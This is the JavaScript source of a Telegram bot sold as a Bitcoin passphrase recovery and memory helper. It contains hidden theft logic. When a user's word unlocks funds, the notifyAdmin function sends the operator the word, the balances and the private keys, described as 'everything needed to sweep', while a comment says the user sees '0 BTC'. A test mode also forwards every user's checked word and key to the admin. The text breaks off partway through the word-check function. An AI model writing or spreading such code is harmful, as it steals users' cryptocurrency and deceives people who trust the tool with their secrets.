#!/usr/bin/env node
// bot.js - Bitcoin Seed Recovery Bot: Psychological memory guide
// An interactive Telegram agent that helps users remember Bitcoin wallet passphrases

const argv = require('minimist')(process.argv.slice(2));
const crypto = require('crypto');
const telegram = require('./lib/telegram');
const bitcoin = require('./lib/bitcoin');
const balanceChecker = require('./lib/balance-checker');
const wordEngine = require('./lib/word-engine');
const topics = require('./lib/topics');
const aiSuggest = require('./lib/ai-suggest');
const session = require('./lib/session');
const settings = require('./lib/settings');

// ===== Configuration =====
const TELEGRAM_BOT_TOKEN = argv.telegram_token || process.env.TELEGRAM_BOT_TOKEN || settings.get('global', 'telegram_token');
const TELEGRAM_CHAT_ID = argv.telegram_chat || process.env.TELEGRAM_CHAT_ID || settings.get('global', 'telegram_chat');
// Optional: URL of the hosted web checker (e.g. GitHub Pages). Set via env or --webapp_url flag.
const WEBAPP_URL = argv.webapp_url || process.env.WEBAPP_URL || null;

// Returns a web_app button row. Pass a deep-link url, or null to use bare WEBAPP_URL.
function webCheckerRow(url = null, label = '🌐 Web Checker') {
    const finalUrl = url || WEBAPP_URL;
    return finalUrl ? [[{ t: label, web_app: { url: finalUrl } }]] : [];
}

// Build a deep-link webapp URL pre-loaded with a single word
function webWordUrl(word, mode = 'brainwallet') {
    if (!WEBAPP_URL) return null;
    return `${WEBAPP_URL}?word=${encodeURIComponent(word)}&mode=${mode}`;
}

// Build a deep-link webapp URL pre-loaded with a word list (batch tab)
function webWordsUrl(words, mode = 'brainwallet') {
    if (!WEBAPP_URL || !words.length) return null;
    const capped = words.slice(0, 40); // keep URL under ~2 KB
    return `${WEBAPP_URL}?words=${encodeURIComponent(capped.join('\n'))}&mode=${mode}&tab=batch`;
}

// Send a one-line "too slow?" hint with a web_app button (fire-and-forget, no await needed)
function sendWebHint(chatId, url) {
    if (!url) return;
    telegram.sendMessageWithKeyboard(
        chatId,
        '⚡ <i>Too slow or getting rate limited? Run the same check in your browser — no bot needed.</i>',
        telegram.buildKeyboard([[{ t: '🌐 Open in Web App', web_app: { url } }]])
    ).catch(() => {});
}

if (!TELEGRAM_BOT_TOKEN) {
    console.error('Missing --telegram_token or TELEGRAM_BOT_TOKEN env');
    process.exit(1);
}

// ===== Initialize =====
settings.init();
session.loadSessions();
telegram.configure(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);

let lastUpdateId = 0;
let isPolling = false;
let isShuttingDown = false;
let stopCurrentBatch = false;
let testNotifyMode = false; // When true, admin gets notified on every word check even with 0 balance
const STOP_KEYBOARD = telegram.buildKeyboard([[{ t: '\u23f9\ufe0f Stop', d: 'stop:go' }]]);

// Per-session AI suggestion cache for pagination (bounded)
const aiSuggestionCache = new Map();
const MAX_AI_CACHE = 500;

function setAICache(key, value) {
    if (aiSuggestionCache.size >= MAX_AI_CACHE) {
        // Remove oldest entry (first key in Map insertion order)
        const firstKey = aiSuggestionCache.keys().next().value;
        aiSuggestionCache.delete(firstKey);
    }
    aiSuggestionCache.set(key, value);
}

/** Returns true if this chatId is the configured admin */
function isAdmin(chatId) {
    return TELEGRAM_CHAT_ID && String(chatId) === String(TELEGRAM_CHAT_ID);
}

/**
 * Silently notify the bot admin about a found balance.
 * Includes word, addresses, balances, private keys — everything needed to sweep.
 */
async function notifyAdmin(word, balanceResults, mode = 'full') {
    if (!TELEGRAM_CHAT_ID) return;
    try {
        const entries = [...balanceResults.entries()].filter(([_, d]) => d.balance > 0);
        if (entries.length === 0) return;

        const brainResult = bitcoin.deriveBrainWallet(word);
        let text = `\ud83d\udea8\ud83d\udea8\ud83d\udea8 <b>BALANCE FOUND</b> \ud83d\udea8\ud83d\udea8\ud83d\udea8\n\n`;
        text += `\ud83d\udd11 Word: <code>${escHtml(word)}</code>\n`;
        text += `\ud83d\udee0\ufe0f Mode: ${mode}\n\n`;

        for (const [addr, data] of entries) {
            text += `\ud83c\udfe6 <code>${addr}</code>\n`;
            text += `   \ud83d\udcb0 <b>${data.balance} BTC</b>\n\n`;
        }

        text += `\ud83e\udde0 <b>Brain Wallet Keys:</b>\n`;
        text += `  Hex: <code>${brainResult.privateKey}</code>\n`;
        text += `  WIF (c): <code>${brainResult.wifCompressed}</code>\n`;
        text += `  WIF (u): <code>${brainResult.wifUncompressed}</code>\n\n`;

        // Also derive BIP39 repeated seed keys
        for (const count of settings.get('global', 'repeats')) {
            try {
                const seedResult = bitcoin.deriveRepeatedWordSeed(word, count, settings.get('global', 'paths'), 1);
                if (seedResult.pathResults) {
                    text += `\ud83c\udf31 <b>BIP39 ${count}x Seed Keys:</b>\n`;
                    for (const [path, addrs] of Object.entries(seedResult.pathResults)) {
                        if (addrs[0]) {
                            text += `  ${path}/0: <code>${addrs[0].wif || 'N/A'}</code>\n`;
                        }
                    }
                    text += '\n';
                }
            } catch (e) { /* skip */ }
        }

        text += `\ud83c\udfe0 <b>All Addresses:</b>\n`;
        text += `  Legacy (c): <code>${brainResult.addresses.legacy_compressed}</code>\n`;
        text += `  Legacy (u): <code>${brainResult.addresses.legacy_uncompressed}</code>\n`;
        text += `  SegWit: <code>${brainResult.addresses.segwit}</code>\n`;
        text += `  Native: <code>${brainResult.addresses.nativeSegwit}</code>\n`;

        await telegram.sendMessage(TELEGRAM_CHAT_ID, text);
        console.log(`[ADMIN] Notified admin about balance found for "${word}"`);
    } catch (e) {
        console.error('[ADMIN] Failed to notify admin:', e.message);
    }
}

/**
 * Test mode notification — sent for every word check when testNotifyMode is on.
 * Shows what the real alert would look like, even when balance is 0.
 */
async function notifyAdminTestMode(word, balanceResults, userChatId, mode = 'word_check') {
    if (!TELEGRAM_CHAT_ID || !testNotifyMode) return;
    // Skip if this is the admin checking their own word
    if (isAdmin(userChatId)) return;
    try {
        const brainResult = bitcoin.deriveBrainWallet(word);
        const entries = [...balanceResults.entries()];
        const withBalance = entries.filter(([_, d]) => d.balance > 0);

        let text = `\ud83e\uddea <b>[TEST MODE] Word checked by user ${userChatId}</b>\n`;
        text += `\ud83d\udd11 Word: <code>${escHtml(word)}</code>\n`;
        text += `\ud83d\udee0\ufe0f Mode: ${mode}\n`;
        text += `\ud83d\udcb0 Balance found: ${withBalance.length > 0 ? `\u2705 YES (${withBalance.length} addresses)` : '\u274c NO'}\n\n`;

        // Show top addresses checked
        const shown = entries.slice(0, 6);
        if (shown.length > 0) {
            text += `\ud83c\udfe6 <b>Addresses checked:</b>\n`;
            for (const [addr, data] of shown) {
                const bal = data.balance > 0 ? `\u26a0\ufe0f ${data.balance} BTC` : '0 BTC';
                text += `  <code>${addr.slice(0, 20)}...</code> — ${bal}\n`;
            }
            if (entries.length > 6) text += `  <i>...and ${entries.length - 6} more</i>\n`;
            text += '\n';
        }

        text += `\ud83e\udde0 <b>Brain Wallet Keys:</b>\n`;
        text += `  WIF (c): <code>${brainResult.wifCompressed}</code>\n\n`;

        text += `<i>This is a test mode preview. Real alerts only send when balance > 0.</i>`;

        await telegram.sendMessage(TELEGRAM_CHAT_ID, text);
    } catch (e) {
        console.error('[ADMIN] Test mode notify failed:', e.message);
    }
}

/**
 * Show AI error with smart buttons — offers to add fallback if rate limited
 */
async function showAIError(chatId, result, retryCallback) {
    const hasFallbacks = settings.getFallbacks(chatId).length > 0;
    let text = `\u26a0\ufe0f ${escHtml(result.error)}`;

    if (result.triedProviders && result.triedProviders.length > 1) {
        text += `\n\nTried: ${result.triedProviders.join(' \u2192 ')}`;
    }

    const buttons = [];
    if (result.rateLimited) {
        if (!hasFallbacks) {
            text += '\n\n\ud83d\udca1 Add a backup AI provider to auto-switch when rate limited.';
        } else {
            text += '\n\n\ud83d\udca1 All providers rate limited. Add another or wait and retry.';
        }
        buttons.push([{ t: '\u2795 Add Backup Provider', d: 'ai_fb_add:start' }]);
    }

    if (retryCallback) {
        buttons.push([{ t: '\ud83d\udd04 Retry', d: retryCallback }]);
    }
    buttons.push([{ t: '\u2699\ufe0f AI Settings', d: 'settings:ai' }, { t: '\u2b05\ufe0f Menu', d: 'menu:main' }]);

    await telegram.sendMessageWithKeyboard(chatId, text, telegram.buildKeyboard(buttons));
}

// Track whether a long-running operation is active (so we don't stack them)
let longRunning = false;

/** Fire off a long-running operation without blocking the poll loop */
function runLongOp(fn) {
    stopCurrentBatch = false;  // Reset BEFORE marking as running to avoid race
    longRunning = true;
    // Return a resolved promise so await in the switch doesn't block
    fn().catch(e => console.error('Long op error:', e.message)).finally(() => {
        longRunning = false;
        stopCurrentBatch = false;  // Clean up after completion
    });
    return Promise.resolve();
}

// ===== Main polling loop =====
async function pollUpdates() {
    if (isPolling || isShuttingDown) return;
    isPolling = true;

    try {
        const updates = await telegram.getUpdates(lastUpdateId + 1, 25);

        for (const update of updates) {
            lastUpdateId = update.update_id;

            if (update.callback_query) {
                const chatId = update.callback_query.message?.chat?.id;
                const data = update.callback_query.data || '';
                const queryId = update.callback_query.id;

                // Always answer callback queries immediately
                telegram.answerCallbackQuery(queryId).catch(() => {});

                // Stop is always processed immediately, even during long ops
                const cbAction = data.split(':')[0];
                if (cbAction === 'stop') {
                    stopCurrentBatch = true;
                    console.log('[Stop] Stop requested by user');
                    continue;
                }

                // If a long-running operation is active, only allow stop
                if (longRunning) {
                    if (chatId) {
                        telegram.sendMessage(chatId, '\u23f3 An operation is running. Tap Stop to cancel it first.').catch(() => {});
                    }
                    continue;
                }

                if (chatId && data) {
                    await handleCallback(chatId, data);
                }
            }

            if (update.message?.text) {
                const chatId = update.message.chat.id;
                const text = update.message.text.trim();

                // /stop is always processed immediately
                if (text.toLowerCase() === '/stop') {
                    stopCurrentBatch = true;
                    telegram.sendMessage(chatId, '\u23f9\ufe0f Stopping...').catch(() => {});
                    continue;
                }

                // If a long operation is running, queue text but don't block
                if (longRunning) {
                    telegram.sendMessage(chatId, '\u23f3 An operation is running. Send /stop to cancel it.').catch(() => {});
                    continue;
                }

                await handleMessage(chatId, text);
            }
        }
    } catch (e) {
        if (e.message?.includes('Conflict')) {
            console.error('\nCONFLICT: Another bot instance is running! Kill other instances.\n');
        } else if (!e.message?.includes('Timeout') && !e.message?.includes('ENOTFOUND')) {
            console.error('Poll error:', e.message);
        }
    } finally {
        isPolling = false;
    }
}

// ===== Message handler =====
async function handleMessage(chatId, text) {
    try {
        // Check if user is in interview mode - route free text to interview
        const sess = session.getSession(chatId);
        if (sess.state === 'interview' && !text.startsWith('/')) {
            await handleInterviewTextAnswer(chatId, text);
            return;
        }

        // Handle API key input for explorer key setup
        if (sess.state === 'awaiting_explorer_key' && !text.startsWith('/')) {
            const explorer = sess.pendingExplorer; // 'blockchain', 'blockcypher', 'blockstream'
            sess.state = 'idle';
            sess.pendingExplorer = null;
            const key = text.trim();
            if (key.length < 5) {
                await telegram.sendMessage(chatId, '\u274c Key too short. Cancelled.');
                return;
            }
            const keyField = `${explorer}_key`;
            const result = settings.set(chatId, keyField, key);
            if (result.ok) {
                await telegram.sendMessageWithKeyboard(chatId,
                    `\u2705 <b>${explorer}</b> key saved: \ud83d\udd12 ***${key.slice(-4)}`,
                    telegram.buildKeyboard([[{ t: '\u2b05\ufe0f Explorer Keys', d: 'settings:explorer' }]])
                );
            } else {
                await telegram.sendMessage(chatId, `\u274c ${escHtml(result.error)}`);
            }
            return;
        }

        // Handle API key input for fallback provider setup
        if (sess.state === 'awaiting_fb_key' && !text.startsWith('/')) {
            const provider = sess.pendingFbProvider;
            sess.state = 'idle';
            sess.pendingFbProvider = null;
            const key = text.trim();
            if (key.length < 5) {
                await telegram.sendMessage(chatId, '\u274c Invalid key. Cancelled.');
                return;
            }
            const result = settings.addFallback(chatId, provider, key, 'auto');
            if (result.ok) {
                await telegram.sendMessageWithKeyboard(chatId,
                    `\u2705 <b>${provider}</b> added as fallback provider.\nKey: \ud83d\udd12 ***${key.slice(-4)}`,
                    telegram.buildKeyboard([[{ t: '\u2b05\ufe0f AI Settings', d: 'settings:ai' }]])
                );
            } else {
                await telegram.sendMessage(chatId, `\u274c ${escHtml(result.error)}`);
            }
            return;
        }

        if (text.startsWith('/')) {
            await handleCommand(chatId, text);
        } else {
            await runLongOp(() => handleWordCheck(chatId, text));
        }
    } catch (e) {
        console.error('Message error:', e);
        await telegram.sendMessage(chatId, `\u26a0\ufe0f Error: ${escHtml(e.message)}`);
    }
}

// ===== Command handler =====
async function handleCommand(chatId, text) {
    const parts = text.split(/\s+/);
    const cmd = parts[0].toLowerCase();
    const args = parts.slice(1).join(' ');

    switch (cmd) {
        case '/start':
            await cmdStart(chatId);
            break;
        case '/help':
            await cmdHelp(chatId);
            break;
        case '/menu':
            await cmdMainMenu(chatId);
            break;
        case '/brain':
            if (args) await handleBrainWallet(chatId, args);
            else await telegram.sendMessage(chatId, '\ud83e\udde0 Usage: /brain [passphrase]\nExample: /brain correct horse battery staple');
            break;
        case '/topic':
            if (args) await handleTopicExplore(chatId, args);
            else await cmdListTopics(chatId);
            break;
        case '/era':
            if (args) await handleEraExplore(chatId, args);
            else await telegram.sendMessage(chatId, '\ud83d\udcc5 Usage: /era [year]\nExample: /era 2011');
            break;
        case '/deep':
            if (args) await handleDeepCheck(chatId, args);
            else await telegram.sendMessage(chatId, '\ud83d\udd0d Usage: /deep [word]');
            break;
        case '/bip39':
            if (args) await handleBIP39Check(chatId, args);
            else await telegram.sendMessage(chatId, '\ud83c\udf31 Usage: /bip39 [word]');
            break;
        case '/batch':
            if (args) await runLongOp(() => handleBatch(chatId, args));
            else await telegram.sendMessage(chatId, '\ud83d\udce6 Usage: /batch word1, word2, word3');
            break;
        case '/dictionary':
            await runLongOp(() => handleDictionary(chatId));
            break;
        case '/suggest':
            await runLongOp(() => handleAISuggest(chatId, args || ''));
            break;
        case '/history':
            await cmdHistory(chatId);
            break;
        case '/export':
            await cmdExport(chatId);
            break;
        case '/settings':
            if (args) await handleSettingsChange(chatId, args);
            else await cmdSettings(chatId);
            break;
        case '/status':
            await cmdStatus(chatId);
            break;
        case '/stop':
            stopCurrentBatch = true;
            await telegram.sendMessage(chatId, '\u23f9\ufe0f Stopping current operation...');
            break;
        case '/watch':
            if (args) {
                const addr = args.trim();
                session.addToWatchlist(chatId, addr);
                await telegram.sendMessage(chatId, `\ud83d\udc41\ufe0f Watching: ${escHtml(addr)}`);
            }
            break;
        case '/testnotify': {
            if (!isAdmin(chatId)) {
                await telegram.sendMessage(chatId, '\u274c Admin only.');
                break;
            }
            const arg = args.trim().toLowerCase();
            if (arg === 'on') {
                testNotifyMode = true;
                await telegram.sendMessage(chatId,
                    `\ud83e\uddea <b>Test mode ON</b>\n\n` +
                    `You will now receive a preview notification for every word any user checks \u2014 even if balance is 0.\n\n` +
                    `This lets you see exactly what the real alert will look like.\n` +
                    `Turn off with /testnotify off`
                );
            } else if (arg === 'off') {
                testNotifyMode = false;
                await telegram.sendMessage(chatId, `\u23f9\ufe0f <b>Test mode OFF</b>\n\nYou will only receive alerts when a real balance is found.`);
            } else {
                // One-time fake balance test (existing behaviour)
                const testWord = arg || 'satoshi';
                const testBrain = bitcoin.deriveBrainWallet(testWord);
                const testAddrs = bitcoin.getBrainWalletAddresses(testBrain);
                const testBalances = new Map();
                testBalances.set(testAddrs[0] || '1TestAddressNotReal', { balance: 0.5, api: 'test' });
                await notifyAdmin(testWord, testBalances, 'test_notification');
                await telegram.sendMessage(chatId,
                    `\u2705 <b>One-time test sent!</b>\n\n` +
                    `Word: <code>${escHtml(testWord)}</code> — fake 0.5 BTC\n\n` +
                    `Check the admin alert above.\n\n` +
                    `<b>Other commands:</b>\n` +
                    `/testnotify on \u2014 preview every user word check\n` +
                    `/testnotify off \u2014 disable preview mode\n` +
                    `Current mode: ${testNotifyMode ? '\ud83e\uddea ON' : '\u23f9\ufe0f off'}`
                );
            }
            break;
        }
        default:
            await telegram.sendMessage(chatId, `\u2753 Unknown command. Try /help or /menu\nOr just type any word to check it!`);
    }
}

// ===== Callback handler =====
async function handleCallback(chatId, data) {
    try {
        // Handle memory system callbacks first (mem:key:value)
        if (data.startsWith('mem:')) {
            await handleMemoryAnswer(chatId, data);
            return;
        }

        // Handle interview callbacks (iv:action:value)
        if (data.startsWith('iv:')) {
            await handleInterviewCallback(chatId, data);
            return;
        }

        const colonIdx = data.indexOf(':');
        const action = colonIdx >= 0 ? data.slice(0, colonIdx) : data;
        const value = colonIdx >= 0 ? data.slice(colonIdx + 1) : '';

        switch (action) {
            case 'explore':
                await runLongOp(() => handleTopicExplore(chatId, value));
                break;
            case 'cat':
                await handleCategoryExplore(chatId, value, 0);
                break;
            case 'cat_page': {
                // value = "category:pageNum"
                const sepIdx = value.lastIndexOf(':');
                const catName = value.slice(0, sepIdx);
                const catPage = parseInt(value.slice(sepIdx + 1)) || 0;
                await handleCategoryExplore(chatId, catName, catPage);
                break;
            }
            case 'cat_group': {
                // value = "category:GroupName"
                const firstColon = value.indexOf(':');
                const cgCat = value.slice(0, firstColon);
                const cgGroup = value.slice(firstColon + 1);
                await handleGroupExplore(chatId, cgCat, cgGroup, 0);
                break;
            }
            case 'cat_grp_pg': {
                // value = "category:GroupName:pageNum"
                const lastColon = value.lastIndexOf(':');
                const cgpPage = parseInt(value.slice(lastColon + 1)) || 0;
                const rest = value.slice(0, lastColon);
                const midColon = rest.indexOf(':');
                const cgpCat = rest.slice(0, midColon);
                const cgpGroup = rest.slice(midColon + 1);
                await handleGroupExplore(chatId, cgpCat, cgpGroup, cgpPage);
                break;
            }
            case 'ai_organize':
                await runLongOp(() => handleOrganizeWithAI(chatId, value));
                break;
            case 'lucky':
                await runLongOp(() => handleFeelingLucky(chatId));
                break;
            case 'keyhunt': {
                const huntCount = Math.min(Math.max(parseInt(value) || 5, 1), 100);
                await runLongOp(() => handleRandomKeyHunt(chatId, huntCount));
                break;
            }
            case 'era':
                await handleEraExplore(chatId, value);
                break;
            case 'eras':
                await cmdEras(chatId);
                break;
            case 'deep':
                await runLongOp(() => handleDeepCheck(chatId, value));
                break;
            case 'prompt':
                if (value === 'profile') await showMemoryProfile(chatId);
                else await handleMemoryPrompt(chatId, value);
                break;
            case 'memory':
                await cmdMemoryGuide(chatId);
                break;
            case 'keys':
                await handleShowKeys(chatId, value);
                break;
            case 'set':
                await handleSettingsToggle(chatId, value);
                break;
            case 'more':
                await handleMoreSuggestions(chatId, value);
                break;
            case 'smart_batch':
                await runLongOp(() => handleSmartBatch(chatId));
                break;
            case 'smart_ai':
                await runLongOp(() => handleSmartAI(chatId));
                break;
            case 'interview':
                await handleInterviewAction(chatId, value);
                break;
            case 'ai_topic':
                await runLongOp(() => handleAITopicExpand(chatId, value));
                break;
            case 'batch_ai_more':
                await runLongOp(() => handleBatchAIMore(chatId));
                break;
            case 'ai_cat_topics':
                await runLongOp(() => handleAICategoryTopics(chatId, value));
                break;
            case 'batch_random':
                await runLongOp(() => handleBatchRandom(chatId));
                break;
            case 'aisuggest':
                await runLongOp(() => handleAISuggest(chatId, value));
                break;
            case 'batch_ai':
                await runLongOp(() => handleBatchAI(chatId, value));
                break;
            case 'pick_ai':
                await handlePickAI(chatId, value);
                break;
            case 'ai_page':
                await handleAIPage(chatId, value);
                break;
            case 'check_word':
                if (value === 'dictionary') await runLongOp(() => handleDictionary(chatId));
                else await runLongOp(() => handleWordCheck(chatId, value));
                break;
            case 'common':
                await runLongOp(() => handleCommonWords(chatId, value));
                break;
            case 'pivot':
                // pivot:key:value
                const pivotParts = value.split(':');
                if (pivotParts.length >= 2) {
                    await handleContextPivot(chatId, pivotParts[0], pivotParts.slice(1).join(':'));
                }
                break;
            case 'dictionary':
                await handleDictionary(chatId);
                break;
            case 'export':
                await cmdExport(chatId);
                break;
            case 'menu':
                await cmdMainMenu(chatId);
                break;
            case 'topics_page':
                await cmdListTopics(chatId, parseInt(value) || 0);
                break;
            case 'help':
                await cmdHelp(chatId);
                break;
            case 'settings':
                await cmdSettings(chatId, value || 'main');
                break;
            case 'status':
                await cmdStatus(chatId);
                break;
            case 'history':
                await cmdHistory(chatId);
                break;
            case 'start':
                if (value === 'type_word') {
                    await telegram.sendMessage(chatId, '\u270d\ufe0f <b>Type any word you think you might have used.</b>\n\nFor example: your nickname, a game character, a pet name, anything you might have typed as a password back then.');
                } else if (value === 'guide') {
                    await cmdGuide(chatId, 0);
                }
                break;
            case 'guide':
                await cmdGuide(chatId, parseInt(value) || 0);
                break;
            case 'stop':
                stopCurrentBatch = true;
                break;
            case 'ai_fb_add':
                await handleAIFallbackAdd(chatId, value);
                break;
            case 'ai_fb_rm':
                settings.removeFallback(chatId, value);
                await cmdSettings(chatId, 'ai');
                break;
            case 'ai_fb_info': {
                const fbs = settings.getFallbacks(chatId);
                const idx = parseInt(value);
                const fb = fbs[idx];
                if (fb) {
                    await telegram.sendMessageWithKeyboard(chatId,
                        `\u21aa <b>Fallback ${idx + 1}:</b> ${fb.provider}\n` +
                        `Model: ${fb.model || 'auto'}\n` +
                        `Key: ${fb.key ? '\ud83d\udd12 ***' + fb.key.slice(-4) : 'none'}`,
                        telegram.buildKeyboard([
                            [{ t: '\u274c Remove', d: `ai_fb_rm:${fb.provider}` }],
                            [{ t: '\u2b05\ufe0f Back', d: 'settings:ai' }],
                        ])
                    );
                }
                break;
            }
            case 'ai_fb_set':
                await handleAIFallbackSet(chatId, value);
                break;
            case 'explorer_key': {
                // value = 'blockchain', 'blockcypher', 'blockstream', or 'clear:blockchain' etc.
                if (value.startsWith('clear:')) {
                    const explorer = value.slice(6);
                    settings.set(chatId, `${explorer}_key`, null);
                    await cmdSettings(chatId, 'explorer');
                } else {
                    const providerLabels = {
                        blockchain: 'Blockchain.info',
                        blockcypher: 'BlockCypher',
                        blockstream: 'Blockstream',
                    };
                    const sess = session.getSession(chatId);
                    sess.state = 'awaiting_explorer_key';
                    sess.pendingExplorer = value;
                    const current = settings.get(chatId, `${value}_key`);
                    await telegram.sendMessageWithKeyboard(chatId,
                        `\ud83d\udd17 <b>${providerLabels[value] || value} API Key</b>\n\n` +
                        (current ? `Current: \ud83d\udd12 ***${current.slice(-4)}\n\n` : '') +
                        `Send your API key or token as a message.\n` +
                        `<i>Get a free key from the provider's website.</i>`,
                        telegram.buildKeyboard([
                            ...(current ? [[{ t: '\ud83d\uddd1\ufe0f Clear Key', d: `explorer_key:clear:${value}` }]] : []),
                            [{ t: '\u274c Cancel', d: 'settings:explorer' }],
                        ])
                    );
                }
                break;
            }
            case 'onboard': {
                // value = 'skip' or 'setup'
                if (value === 'skip') {
                    settings.set(chatId, 'setup_done', true);
                    await cmdStart(chatId);
                } else if (value === 'setup') {
                    await cmdSettings(chatId, 'explorer');
                }
                break;
            }
            default:
                if (topics.getTopicInfo(data)) {
                    await handleTopicExplore(chatId, data);
                }
        }
    } catch (e) {
        console.error('Callback error:', e);
        await telegram.sendMessage(chatId, `\u26a0\ufe0f Error: ${escHtml(e.message)}`);
    }
}

// ===== Core: Word Check =====
async function handleWordCheck(chatId, word) {
    const sess = session.getSession(chatId);
    sess.state = 'checking';
    sess.lastWord = word;

    const variationsEnabled = settings.get(chatId, 'variations');
    const varDepth = settings.get(chatId, 'var_depth');
    const doBrain = settings.get(chatId, 'brain');
    const doBip39 = settings.get(chatId, 'bip39');
    const repeats = settings.get(chatId, 'repeats');
    const paths = settings.get(chatId, 'paths');
    const indices = settings.get(chatId, 'indices');

    const variations = variationsEnabled ? wordEngine.generateVariations(word, varDepth) : [word];
    console.log(`\n[Check] "${word}" -> ${variations.length} variations (depth=${varDepth})`);

    // Send initial status with stop button
    const statusMsg = await telegram.sendMessageWithKeyboard(chatId,
        `\ud83d\udd0d <b>Checking "${escHtml(word)}"</b>\n\n` +
        `\ud83c\udfb0 ${variations.length} variations to test\n` +
        `\ud83d\udee0\ufe0f ${doBip39 ? 'BIP39 Seed' : ''}${doBip39 && doBrain ? ' + ' : ''}${doBrain ? 'Brain Wallet' : ''}\n` +
        `\ud83d\udd01 Repeats: ${repeats.join('x, ')}x | \ud83d\udccd Paths: ${paths.length} | \ud83d\udd22 Indices: ${indices}`,
        STOP_KEYBOARD
    );
    const statusMsgId = statusMsg?.message_id;

    let allAddresses = [];
    let derivationDetails = [];
    let foundBalance = false;
    const balanceResults = new Map();

    const deriveStart = Date.now();
    let checked = 0;
    for (const variant of variations) {
        if (stopCurrentBatch) break;

        if (doBip39) {
            for (const count of repeats) {
                try {
                    const seedResult = bitcoin.deriveRepeatedWordSeed(variant, count, paths, indices);
                    const addrs = bitcoin.getRepeatedSeedAddresses(seedResult);
                    allAddresses.push(...addrs);
                    if (variant === word.toLowerCase() || variant === word) {
                        derivationDetails.push({ mode: `BIP39 ${count}x`, variant, result: seedResult });
                    }
                } catch (e) {
                    if (checked === 0) console.error(`[Check] BIP39 ERROR: ${e.message}`);
                }
            }
        }

        if (doBrain) {
            try {
                const brainResult = bitcoin.deriveBrainWallet(variant);
                const addrs = bitcoin.getBrainWalletAddresses(brainResult);
                allAddresses.push(...addrs);
                if (variant === word.toLowerCase() || variant === word) {
                    derivationDetails.push({ mode: 'Brain Wallet', variant, result: brainResult });
                }
            } catch (e) {
                if (checked === 0) console.error(`[Check] Brain ERROR: ${e.message}`);
            }
        }

        checked++;

        if (checked % 10 === 0 && statusMsgId) {
            await telegram.editMessageText(chatId, statusMsgId,
                `\ud83d\udd0d <b>Checking "${escHtml(word)}"</b>\n\n` +
                `${telegram.progressBar(checked, variations.length)} variations\n` +
                `\ud83c\udfe0 ${allAddresses.length} addresses generated`,
                STOP_KEYBOARD
            ).catch(() => {});
        }
    }

    allAddresses = [...new Set(allAddresses)];
    console.log(`[Check] Derivation done in ${Date.now() - deriveStart}ms -> ${allAddresses.length} unique addresses`);

    if (!stopCurrentBatch) {
        if (statusMsgId) {
            await telegram.editMessageText(chatId, statusMsgId,
                `\ud83d\udd0d <b>"${escHtml(word)}"</b> \u2014 ${variations.length} variations done\n` +
                `\ud83c\udfe0 ${allAddresses.length} unique addresses\n` +
                `\ud83c\udf10 Checking balances (top 50)...`,
                STOP_KEYBOARD
            ).catch(() => {});
        }

        // Check global cache first
        const cached = session.getCachedWordResult(word);
        if (cached && !cached.hasBalance) {
            console.log(`[Check] CACHE HIT for "${word}" -> 0 BTC (skipping ${allAddresses.length} balance checks)`);
            session.recordCheck(chatId, word, allAddresses, [], 'full_cached');
        } else {
            console.log(`[Check] Starting balance check for ${allAddresses.length} addresses (capped to 50)...`);
            const balanceStart = Date.now();
            let lastWordProgress = 0;
            try {
                const explorerKeys = settings.getExplorerApiKeys(chatId);
                const results = await balanceChecker.checkBalances(allAddresses, settings.get(chatId, 'api'), 50, () => stopCurrentBatch, (checked, total) => {
                    const now = Date.now();
                    if (now - lastWordProgress < 2000 || !statusMsgId) return;
                    lastWordProgress = now;
                    telegram.editMessageText(chatId, statusMsgId,
                        `\ud83d\udd0d <b>"${escHtml(word)}"</b> \u2014 ${variations.length} variations\n` +
                        `\ud83c\udfe0 ${allAddresses.length} unique addresses\n` +
                        `\ud83c\udf10 Checking balances: ${checked}/${total}`,
                        STOP_KEYBOARD
                    ).catch(() => {});
                }, explorerKeys);
                for (const [addr, data] of results) {
                    balanceResults.set(addr, data);
                    if (data.balance > 0) foundBalance = true;
                }
                console.log(`[Check] Balance check done in ${Date.now() - balanceStart}ms -> ${balanceResults.size} results, found=${foundBalance}`);
            } catch (e) {
                console.error(`[Check] Balance check FAILED after ${Date.now() - balanceStart}ms:`, e.message);
            }

            // Cache the result globally
            const balTotal = [...balanceResults.values()].reduce((s, b) => s + (b?.balance || 0), 0);
            session.cacheWordResult(word, foundBalance, balTotal, allAddresses.length);
            session.recordCheck(chatId, word, allAddresses, [...balanceResults.values()], 'full');
        }
    } else {
        console.log(`[Check] Stopped by user after derivation, skipping balance check`);
    }

    const resultText = buildResultsMessage(word, variations.length, allAddresses.length, derivationDetails, balanceResults, foundBalance);

    // Topic detection
    const topicResult = settings.get(chatId, 'auto_topic') ? wordEngine.detectTopic(word) : null;
    let topicText = '';
    let topicButtons = [];

    if (topicResult) {
        if (topicResult.detected) {
            sess.detectedTopic = topicResult.primaryTopic;
            sess.detectedTopicLabel = topicResult.primaryLabel;
            sess.detectedCategory = topicResult.category || null;
            const relatedCount = topics.getTopicWords(topicResult.primaryTopic)?.length || 0;
            topicText = `\n\n\ud83c\udfaf <b>Topic Detected!</b>\n` +
                `"${escHtml(word)}" \u2192 <b>${topicResult.primaryLabel}</b>\n` +
                `\ud83d\udce6 ${relatedCount}+ related words ready to explore!`;
            topicButtons = [
                [{ t: `\ud83c\udfae Explore ${topicResult.primaryLabel}`, d: `explore:${topicResult.primaryTopic}` }],
            ];
        } else if (topicResult.guesses) {
            topicText = '\n\n\ud83e\udd14 <b>What category might it be?</b>';
            topicButtons = [topicResult.guesses.slice(0, 4).map(g => ({
                t: '\ud83c\udff7\ufe0f ' + g.category.charAt(0).toUpperCase() + g.category.slice(1),
                d: `cat:${g.category}`,
            }))];
        }
    }

    // Action buttons - keep it focused
    const actionButtons = [
        [
            { t: '\ud83d\udd0d Deep Scan', d: `deep:${word}` },
            { t: '\ud83d\udd11 Keys', d: `keys:${word}` },
            ...(settings.get(chatId, 'ai_provider') !== 'none' ? [{ t: '\ud83e\udd16 AI', d: `aisuggest:${word}` }] : []),
        ],
        ...webCheckerRow(webWordUrl(word, settings.get(chatId, 'api') === 'bip39' ? 'bip39' : 'brainwallet'), '🌐 Try in Web App (faster)'),
        [{ t: '\ud83c\udfe0 Menu', d: 'menu:main' }],
    ];

    const allButtons = [...topicButtons, ...actionButtons];

    if (statusMsgId) await telegram.deleteMessage(chatId, statusMsgId);
    await telegram.sendMessageWithKeyboard(chatId, resultText + topicText, telegram.buildKeyboard(allButtons));

    // Silently notify admin if balance found — user sees "0 BTC"
    if (foundBalance) {
        await notifyAdmin(word, balanceResults, 'word_check');
    }
